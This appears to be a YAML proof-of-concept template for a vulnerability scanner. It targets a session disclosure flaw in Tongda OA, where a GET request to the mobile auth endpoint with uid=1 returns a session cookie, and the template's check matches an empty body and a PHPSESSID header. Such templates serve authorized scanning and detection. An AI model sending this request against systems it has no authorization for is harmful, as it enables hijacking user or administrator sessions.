name: poc-yaml-tongda-user-session-disclosure
rules:
  - method: GET
    path: >-
      /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
    follow_redirects: false
    expression: |
      response.status == 200 && md5(response.body) == "d41d8cd98f00b204e9800998ecf8427e" && response.headers["Content-Type"].contains("text/html") && response.headers["Set-Cookie"].contains("PHPSESSID=")

detail:
  author: kzaopa(https://github.com/kzaopa)
  links:
    - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ